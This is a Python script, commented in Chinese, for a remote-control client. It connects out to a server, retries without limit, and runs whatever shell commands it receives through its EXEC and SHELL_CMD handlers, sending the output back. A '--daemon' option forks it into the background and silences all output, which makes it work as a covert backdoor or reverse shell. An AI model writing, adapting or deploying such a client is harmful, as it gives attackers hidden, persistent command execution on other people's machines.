#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import sys
import time
import select
import pty
import tty
import termios
import threading

class Client:
    def __init__(self, server_host='127.0.0.1', server_port=8556):
        self.server_host = server_host
        self.server_port = server_port
        self.sock = None
        self.running = True
        self.in_shell_mode = False
        
    def connect(self):
        """连接到服务端，失败时每2秒重试一次"""
        retry_count = 0
        max_retries = 0  # 0表示无限重试
        
        while self.running:
            try:
                if retry_count > 0:
                    print(f"[*] 第{retry_count}次尝试连接 {self.server_host}:{self.server_port}...")
                else:
                    print(f"[*] 正在连接 {self.server_host}:{self.server_port}...")
                
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(5)  # 连接超时5秒
                self.sock.connect((self.server_host, self.server_port))
                
                print(f"[+] 连接成功！服务器: {self.server_host}:{self.server_port}")
                return True
                
            except socket.timeout:
                print(f"[-] 连接超时，2秒后重试...")
                time.sleep(2)
                retry_count += 1
                
            except ConnectionRefusedError:
                print(f"[-] 连接被拒绝，服务端可能未启动，2秒后重试...")
                time.sleep(2)
                retry_count += 1
                
            except socket.gaierror as e:
                print(f"[-] 地址解析错误: {e}，2秒后重试...")
                time.sleep(2)
                retry_count += 1
                
            except Exception as e:
                print(f"[-] 连接失败: {e}，2秒后重试...")
                time.sleep(2)
                retry_count += 1
                
            # 检查最大重试次数（0表示无限重试）
            if max_retries > 0 and retry_count >= max_retries:
                print(f"[-] 已达到最大重试次数({max_retries})，退出...")
                return False
                
        return False
        
    def keep_alive(self):
        """保持连接，断开时自动重连"""
        while self.running:
            if self.sock is None or self._check_connection() is False:
                print(f"[-] 连接已断开，重新连接中...")
                if self.connect():
                    # 重新连接成功后，继续接收命令
                    self.receive_commands()
                else:
                    print(f"[-] 重连失败，等待2秒后继续...")
                    time.sleep(2)
            else:
                time.sleep(1)
                
    def _check_connection(self):
        """检查连接是否仍然有效"""
        try:
            # 发送一个空数据包来测试连接
            self.sock.send(b'')
            return True
        except (socket.error, OSError):
            return False
            
    def receive_commands(self):
        """接收并执行命令"""
        try:
            # 发送连接成功的确认消息
            self.send_response("客户端已连接，等待指令...")
            
            while self.running:
                try:
                    # 接收数据
                    self.sock.settimeout(1.0)  # 设置接收超时，以便可以定期检查连接状态
                    data = self.sock.recv(4096)
                    if not data:
                        print("[-] 连接断开，等待重连...")
                        break
                        
                    command = data.decode('utf-8', errors='ignore').strip()
                    
                    if command:
                        print(f"[*] 收到命令: {command}")
                        self.execute_command(command)
                        
                except socket.timeout:
                    # 超时是正常的，继续循环
                    continue
                except ConnectionResetError:
                    print("[-] 连接被重置")
                    break
                except BrokenPipeError:
                    print("[-] 管道损坏")
                    break
                except Exception as e:
                    print(f"[-] 接收错误: {e}")
                    break
                    
        except KeyboardInterrupt:
            print("\n[-] 客户端被中断")
        except Exception as e:
            print(f"[-] 接收命令循环错误: {e}")
            
    def execute_command(self, command):
        """执行命令"""
        try:
            parts = command.split(' ', 1)
            cmd_type = parts[0]
            args = parts[1] if len(parts) > 1 else ""
            
            if cmd_type == "ECHO":
                # 显示消息
                self.send_response(f"显示消息: {args}")
                print(args)
                
            elif cmd_type == "COLOR":
                # 改变终端颜色
                colors = {
                    "1": "\033[91m",  # 红色
                    "2": "\033[92m",  # 绿色
                    "3": "\033[93m",  # 黄色
                    "4": "\033[94m",  # 蓝色
                    "5": "\033[95m",  # 紫色
                    "6": "\033[96m",  # 青色
                    "7": "\033[97m",  # 白色
                }
                if args in colors:
                    sys.stdout.write(colors[args])
                    sys.stdout.flush()
                    self.send_response(f"终端颜色已更改为 {args}")
                else:
                    self.send_response("无效的颜色代码")
                    
            elif cmd_type == "VISIT":
                # 访问网站
                self.send_response(f"正在访问网站: {args}")
                try:
                    # 使用curl访问网站
                    result = subprocess.run(
                        ["curl", "-s", "-I", args],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    if result.returncode == 0:
                        self.send_response(f"网站 {args} 可访问")
                    else:
                        self.send_response(f"无法访问网站 {args}")
                except Exception as e:
                    self.send_response(f"访问网站失败: {e}")
                    
            elif cmd_type == "START_SHELL":
                # 启动交互式Shell
                self.send_response("正在启动Shell...")
                self.in_shell_mode = True
                
            elif cmd_type == "SHELL_CMD" and self.in_shell_mode:
                # 执行Shell命令
                self.execute_shell_command(args)
                
            elif cmd_type == "EXIT_SHELL":
                # 退出Shell模式
                self.in_shell_mode = False
                self.send_response("已退出Shell模式")
                
            elif cmd_type == "EXEC":
                # 执行自定义命令
                self.send_response(f"执行命令: {args}")
                try:
                    result = subprocess.run(
                        args,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    output = result.stdout if result.stdout else result.stderr
                    if output:
                        self.send_response(output[:500])  # 限制输出长度
                    self.send_response(f"命令执行完成，退出码: {result.returncode}")
                except subprocess.TimeoutExpired:
                    self.send_response("命令执行超时")
                except Exception as e:
                    self.send_response(f"命令执行失败: {e}")
                    
            else:
                self.send_response(f"未知命令: {cmd_type}")
                
        except Exception as e:
            self.send_response(f"执行命令时出错: {e}")
            
    def execute_shell_command(self, command):
        """执行Shell命令"""
        try:
            # 使用subprocess执行命令
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # 发送输出
            if result.stdout:
                self.send_response(result.stdout[:1000])  # 限制输出长度
            if result.stderr:
                self.send_response(f"STDERR: {result.stderr[:500]}")
            self.send_response(f"退出码: {result.returncode}")
            
        except subprocess.TimeoutExpired:
            self.send_response("命令执行超时")
        except Exception as e:
            self.send_response(f"执行错误: {e}")
            
    def send_response(self, message):
        """发送响应到服务端"""
        try:
            if self.sock:
                response = f"{message}\n"
                self.sock.send(response.encode('utf-8'))
        except Exception as e:
            print(f"[-] 发送响应失败: {e}")
            
    def cleanup(self):
        """清理资源"""
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
                
    def run(self):
        """运行客户端"""
        print("[*] 客户端启动")
        print("[*] 使用 Ctrl+C 退出客户端")
        
        try:
            # 首次连接
            if self.connect():
                # 连接成功后开始接收命令
                self.receive_commands()
        except KeyboardInterrupt:
            print("\n[-] 客户端退出")
        except Exception as e:
            print(f"[-] 客户端错误: {e}")
        finally:
            self.cleanup()

def main():
    # 静默执行，隐藏输出
    if len(sys.argv) > 1 and sys.argv[1] == "--daemon":
        # 在后台运行
        if os.fork() > 0:
            sys.exit(0)
            
        # 关闭标准文件描述符
        sys.stdout = open('/dev/null', 'w')
        sys.stderr = open('/dev/null', 'w')
        sys.stdin = open('/dev/null', 'r')
        
    client = Client()
    client.run()

if __name__ == "__main__":
    # 正常启动: python client.py
    # 后台启动: python client.py --daemon
    main()